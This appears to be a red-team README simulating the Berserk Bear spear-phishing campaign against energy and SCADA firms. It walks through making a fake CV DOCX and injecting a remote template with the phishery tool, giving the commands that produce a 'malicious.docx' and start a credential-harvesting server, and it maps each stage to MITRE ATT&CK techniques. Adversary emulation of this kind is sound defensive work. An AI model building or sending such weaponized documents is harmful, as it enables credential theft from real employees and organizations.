# Berserk Bear APT Adversary Simulation
This is a simulation of attack by (Berserk Bear) APT group targeting critical infrastructure and energy companies around the world, primarily in Europe and the United States, The attack campaign was active from least May 2017. This attack target both the critical infrastructure providers and the vendors those providers use to deliver critical services, the attack chain starts with malicious (XML container) Injected into DOCX file connected to external server over (SMB) used to silently harvest users credentials and was used in spear-phishing attack. I relied on ‏Cisco Talos Intelligence Group‏ tofigure out the details to make this simulation: https://blog.talosintelligence.com/template-injection/

![imageedit_2_8052388982](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/3d592743-ea32-4f8e-9739-1d0696c1bfd2)


If you need to know more about Berserk Bear APT group attacks: https://apt.etda.or.th/cgi-bin/showcard.cgi?g=Berserk%20Bear%2C%20Dragonfly%202%2E0&n=1

This attack included several stages including Injecting a DOCX file and using a malicious XML container that creates a specific alert to obtain credentials and is transferred to the attackers’ server, which in turn is used by them to obtain data for the organizations that were targeted by the spear-phishing attack. The DOCX file was a CV that was  Presented to a person with ten years of experience in software development and SCADA control systems.

1. Create CV DOCX file which will be injected and sent spear phishing.

2. Make injections into DOCX file to obtain credentials using the phishery tool.

3. Credential Phishing is when the target opens the target Word file and enters credentials into the notification that will be shown to them.



## The first stage (delivery technique)

Since the attackers here wanted to target institutions related to energy and energy management systems such as SCADA, the attackers created a DOCX file in the form of a CV to apply for a job. It seems that there was a hiring open to work for such a position, and the attackers sent the CV that contained the malicious XML container, here i created a CV identical to the one they used in the actual attack.

![Screenshot from 2024-05-18 19-21-05](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/b0e13bdf-1816-41a9-99d8-4fc31d751aeb)




## The Second stage (implanting technique)

According to what Cisco Talos Intelligence Group said the attackers worked to inject the DOCX file via a phishery tool, this is because at the time of this attack it was a tool that had not been released for a long time and this is the point where the attackers took advantage of it the most and it is also possible that they made some modifications before using it in this attack.



![Screenshot from 2024-05-21 08-11-09](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/b0bcf631-779b-44d4-899b-b37646a0427f)



Phishery is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication. Phishery also provides the ability easily to inject the URL into a .docx Word document.

Github repository: https://github.com/ryhanson/phishery.git


![photo_2024-05-28_08-22-20](https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/847f8fea-3076-49bb-9703-0375f24e085b)


`sudo apt-get install phishery`

`phishery -u https://192.168.138.138 -i CV.docx -o malicious.docx`

`phishery`

Now the malicious CV will be sent to the target and wait for the Credentials.

## The third stage (execution technique)

Credential Phishing is when the target opens the target Word file and enters credentials into the notification that will be shown to them.


https://github.com/S3N4T0R-0X0/Berserk-Bear-APT/assets/121706460/ac654ad4-45d8-4bea-a0cb-a3a0fc7e567d



## MITRE ATT&CK Techniques

| Technique ID | Technique | Implementation |
|---------------|-----------|----------------|
| **T1566.001** | Phishing: Spearphishing Attachment | Delivers a weaponized DOCX resume via spearphishing email targeting energy and SCADA organizations. |
| **T1221** | Template Injection | Injects a remote template into the DOCX document to trigger retrieval from an attacker-controlled server. |
| **T1187** | Forced Authentication | Forces the victim to authenticate to an attacker-controlled SMB server, exposing NTLM credentials. |
| **T1557** | Adversary-in-the-Middle | Uses SMB authentication to intercept and harvest user credentials during document opening. |
| **T1003** | OS Credential Dumping | Simulates credential theft by capturing NTLM authentication material from the victim. |
| **T1204.001** | User Execution: Malicious Link | Requires the victim to open the weaponized Office document, triggering the remote template retrieval. |
| **T1036** | Masquerading | Disguises the phishing document as a legitimate CV to increase user trust. |

